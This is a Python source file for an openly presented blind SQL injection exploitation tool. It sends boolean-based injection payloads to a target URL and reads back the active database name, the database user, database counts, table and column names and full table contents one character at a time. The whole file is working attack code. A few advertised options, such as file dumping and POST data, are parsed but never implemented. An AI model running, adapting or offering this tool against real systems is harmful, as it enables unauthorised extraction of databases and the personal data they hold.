#!/usr/bin/env python3

import argparse
import requests
from terminaltables import AsciiTable

def main():

	global url
	global payload
	global cookies

	cookies = None

	argv = parse_arguments()
	
	if argv['cookies'] is not None:
		cookies = parse_cookies(argv)

	url = ''.join(argv['u'])
	payload = '&Submit=Submit'
	
	print("---> Testing target...")
	r = requests.get(url, cookies=cookies)
	
	if r is not None:
		print("--> Target is awake\n")

	if argv['activedb']:
		print(f"\n--> Active db: {''.join(find_active_db())}")
	
	if argv['activeuser']:
		print(f"\n--> Active user: {''.join(find_user()).lower()}")

	if argv['ndbs']:
		print(f"\n--> {find_n_db()} dbs found")
	
	if argv['db'] and not argv['t']:
		print(f"Dumping {argv['db']}...")

		dump_db(argv['db'])

	if argv['t'] and argv['db']:
		print(f"Dumping table {argv['db']}.{argv['t']}...")

		dump_table(argv['db'], argv['t'])


def parse_cookies(argv):
	cookies = {}

	to_parse = argv['cookies'].split(";")

	for cookie in to_parse:
		cookie = cookie.split("=")
		cookies[cookie[0]] = cookie[1]

	return cookies

def parse_arguments():
	parser = argparse.ArgumentParser()
	dump_group = parser.add_argument_group('DUMP')

	parser.add_argument('-u', metavar='target', type=str, nargs='+', help = 'Mark injectable parameters with a wildcard e.g. ?id=*')
	parser.add_argument('--cookies', type=str, help = 'e.g. "PHPSESSID=value"')
	parser.add_argument('--data', type=str, help ='Sent over POST (e.g. user=1&pass=1)')

	dump_group.add_argument('--ndbs', help = 'Dump number of databases', action='store_true')
	dump_group.add_argument('--activedb', help = 'Dump active db', action='store_true')
	dump_group.add_argument('--activeuser', help = 'Dump active user', action='store_true')
	dump_group.add_argument('--all-db', help = 'Dump all db', action='store_true')
	
	dump_group.add_argument('--db', type=str, help = 'Dump specified db')
	dump_group.add_argument('--t', type=str, help = 'Dump specified table. Requires db to be specified')
	dump_group.add_argument('--lfi', metavar='FILE', type=str, help = 'Attempt to dump file')

	return vars(parser.parse_args())


def find_active_db() -> str:

	print("--> Finding length of active DB name...")
	db_len = find_query_length("select length(database())")

	print(f"--> Active DB's name has {db_len} characters")
	print("--> Dumping active DB name...")

	return find_query_string("select substring(database(),*,1)", db_len)



def find_user() -> str:

	user_len = find_query_length("select length(user())")

	print(f"--> Active user has {user_len} characters")
	print("--> Printing active user...")

	return find_query_string("select substring(user(),*,1)", user_len)


def find_n_db() -> int:
	return find_query_count("select count(schema_name) from information_schema.schemata")


def dump_db(db_name) -> None:
	
	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
	tables = find_query_string(f"select substring(group_concat(table_name),*,1) from information_schema.tables where table_schema='{db_name}'", concat_len)
	
	tables = tables.split(",")
	for table in tables:
		print(f"Dumping {table}...")
		dump_table(db_name, table) 

def dump_table(db_name, table_name) -> None:
	concat_len = find_query_length(f"select length(group_concat(column_name)) from information_schema.columns where table_name='{table_name}'")
	
	tbl_schema = find_query_string(f"select substring(group_concat(column_name),*,1) from information_schema.columns where table_name='{table_name}'", concat_len)
	table_dump = dump_columns(tbl_schema, db_name, table_name)
	print(AsciiTable(table_dump).table)

def dump_columns(columns, db_name, table_name) -> list:

	columns = columns.replace(",", ",':',")
	tbl_schema = [ columns.split(",':',") ]
	print(tbl_schema)
	record_count = find_query_count(f"select count({tbl_schema[0][0]}) from {db_name}.{table_name}")
	print(f"--> {record_count} records in {db_name}.{table_name}")
	for i in range(0, record_count):
		print("--> Dumping record...")
		query_len = find_query_length(f"select length(concat({columns})) from {db_name}.{table_name} limit {i},1")
		
		# Recibimos y parseamos
		record = find_query_string(f"select substring(concat({columns}),*,1) from {db_name}.{table_name} limit {i},1", query_len)
		tbl_schema.append(record.split(":"))
	return tbl_schema

def find_query_count(query):
	i = 0
	r_base = requests.get(url + payload, cookies=cookies)
	r = r_base

	while r_base.text == r.text:
		i += 1
		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		
	return i

def find_query_length(query):
	res_text = []
	i = 1

	r_base = requests.get(url + payload, cookies=cookies)
	r = r_base

	# Sacar longitud de la query
	while r.text == r_base.text:
		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		i += 1

	return i - 1

def find_query_string(query, query_len):
	char = 32
	i = 1
	query_res = []

	r_base = requests.get(url + payload, cookies=cookies)
	r = r_base
	
	while i <= query_len:
		
		r = requests.get(f"{url}1' and ({query.replace("*", str(i))})='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)

		if r.text != r_base.text:
			query_res.append(chr(char))
			print(f"\r{''.join(query_res).lower()}", end='')		
			i += 1
			char = 32
		else:
			char += 1
	print("\n")

	return ''.join(query_res).lower()

def print_banner():
	text = r"""
   __            ___            
  / /  ___ ___ _/ (_) ___  __ __
 / _ \(_-</ _ `/ / / / _ \/ // /
/_.__/___/\_, /_/_(_) .__/\_, / 
           /_/     /_/   /___/  
"""
	print(text)
	print(" A blind SQL injection exploitation tool")
	print(" By Hugo Barea")
	print(" https://github.com/hugobarea/bsqli_scan\n\n")

if __name__ == '__main__':
	print_banner()
	main()